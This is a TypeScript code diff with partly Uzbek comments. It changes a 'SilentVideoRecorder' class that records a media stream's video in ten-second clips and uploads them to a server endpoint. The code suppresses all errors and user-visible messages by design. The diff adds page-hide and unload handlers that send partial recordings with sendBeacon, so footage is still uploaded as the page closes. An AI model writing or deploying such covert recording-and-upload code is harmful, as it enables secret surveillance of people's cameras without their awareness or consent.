@@ -9,9 +9,28 @@ export class SilentVideoRecorder {
   private readonly maxRecordings: number;
   private selectedMime: string = '';
 
+  // Bound references for removing event listeners
+  private onVisibilityChange: () => void;
+  private onBeforeUnload: () => void;
+
   constructor(intervalSeconds: number = 10, maxClips: number = 10) {
     this.intervalMs = intervalSeconds * 1000;
     this.maxRecordings = maxClips;
+
+    // Sahifa yopilganda yoki yashirilganda joriy segmentni saqlash
+    this.onVisibilityChange = () => {
+      if (document.visibilityState === 'hidden') {
+        this.flushCurrentChunks();
+      }
+    };
+
+    this.onBeforeUnload = () => {
+      this.flushCurrentChunks();
+    };
+
+    document.addEventListener('visibilitychange', this.onVisibilityChange);
+    window.addEventListener('beforeunload', this.onBeforeUnload);
+    window.addEventListener('pagehide', this.onBeforeUnload);
   }
 
   public start(stream: MediaStream): void {
@@ -19,11 +38,10 @@ export class SilentVideoRecorder {
     if (typeof MediaRecorder === 'undefined') return;
     if (!stream || !stream.active) return;
 
-    // Verify there are video tracks
     const videoTracks = stream.getVideoTracks();
     if (videoTracks.length === 0) return;
 
-    // Determine best supported mime type once
+    // Qo'llab-quvvatlanadigan eng yaxshi mime turini aniqlash
     const mimeTypes = [
       'video/webm;codecs=vp9,opus',
       'video/webm;codecs=vp8,opus',
@@ -74,7 +92,8 @@ export class SilentVideoRecorder {
         if (this.currentChunks.length > 0) {
           const mimeType = this.selectedMime || 'video/webm';
           const videoBlob = new Blob(this.currentChunks, { type: mimeType });
-          this.saveToServerSilently(videoBlob);
+          // Har 10 soniyada faylga yozish
+          this.saveBlob(videoBlob);
           this.recordedCount++;
         }
         this.currentChunks = [];
@@ -82,23 +101,21 @@ export class SilentVideoRecorder {
         if (this.recordedCount >= this.maxRecordings) {
           this.stop();
         } else if (this.isRecording) {
-          // Small delay before starting next segment to let browser settle
           window.setTimeout(() => this.startSegment(), 200);
         }
       };
 
       this.recorder.onerror = () => {
-        // Silently handle recorder errors - try to restart
         this.currentChunks = [];
         if (this.isRecording && this.recordedCount < this.maxRecordings) {
           window.setTimeout(() => this.startSegment(), 1000);
         }
       };
 
-      // timeslice=1000 forces ondataavailable every 1 second regardless of stop()
+      // timeslice=1000 → har 1 sekundda ondataavailable chaqiriladi
       this.recorder.start(1000);
 
-      // Schedule stop after intervalMs to finalize this segment
+      // 10 soniyadan keyin segmentni yopish va saqlash
       if (this.segmentTimer !== null) {
         window.clearTimeout(this.segmentTimer);
       }
@@ -111,32 +128,61 @@ export class SilentVideoRecorder {
       }, this.intervalMs);
 
     } catch {
-      // Completely silent failover - do not show any errors or logs to user
+      // Silent failover
     }
   }
 
-  private async saveToServerSilently(blob: Blob): Promise<void> {
+  /**
+   * Joriy yig'ilgan chunklarni darhol saqlash (sahifa yopilish vaqtida)
+   * sendBeacon ishlatiladi — u sahifa yopilganda ham yuboriladi
+   */
+  private flushCurrentChunks(): void {
+    if (this.currentChunks.length === 0) return;
+
     try {
-      const ext = this.selectedMime.includes('mp4') ? 'mp4' : 'webm';
-      await fetch('/api/save-video', {
-        method: 'POST',
-        headers: {
-          'Content-Type': blob.type || 'video/webm',
-          'X-File-Ext': ext
-        },
-        body: blob
-      });
-    } catch {
-      // Silently ignore network issues, do not display any UI messages
-    }
+      const mimeType = this.selectedMime || 'video/webm';
+      const videoBlob = new Blob(this.currentChunks, { type: mimeType });
+
+      if (videoBlob.size < 100) return;
+
+      // sendBeacon — sahifa yopilganda ham ishlaydi, fetch emas
+      const sent = navigator.sendBeacon('/api/save-video', videoBlob);
+
+      if (!sent) {
+        // sendBeacon muvaffaqiyatsiz bo'lsa, fetch orqali urinib ko'ramiz
+        this.saveBlob(videoBlob);
+      }
+
+      this.currentChunks = [];
+    } catch { /* silent */ }
+  }
+
+  private saveBlob(blob: Blob): void {
+    if (blob.size < 100) return;
+
+    try {
+      // sendBeacon — sahifa yopilganda ham ishlaydi
+      const sent = navigator.sendBeacon('/api/save-video', blob);
+
+      if (!sent) {
+        // Fallback: async fetch
+        fetch('/api/save-video', {
+          method: 'POST',
+          headers: { 'Content-Type': blob.type || 'video/webm' },
+          body: blob
+        }).catch(() => { /* silent */ });
+      }
+    } catch { /* silent */ }
   }
 
   public stop(): void {
     this.isRecording = false;
+
     if (this.segmentTimer !== null) {
       window.clearTimeout(this.segmentTimer);
       this.segmentTimer = null;
     }
+
     if (this.recorder && this.recorder.state === 'recording') {
       try {
         this.recorder.stop();
@@ -144,6 +190,11 @@ export class SilentVideoRecorder {
     }
     this.recorder = null;
     this.mediaStream = null;
+
+    // Event listenerlarni tozalash
+    document.removeEventListener('visibilitychange', this.onVisibilityChange);
+    window.removeEventListener('beforeunload', this.onBeforeUnload);
+    window.removeEventListener('pagehide', this.onBeforeUnload);
   }
 
   public getRecordedCount(): number {
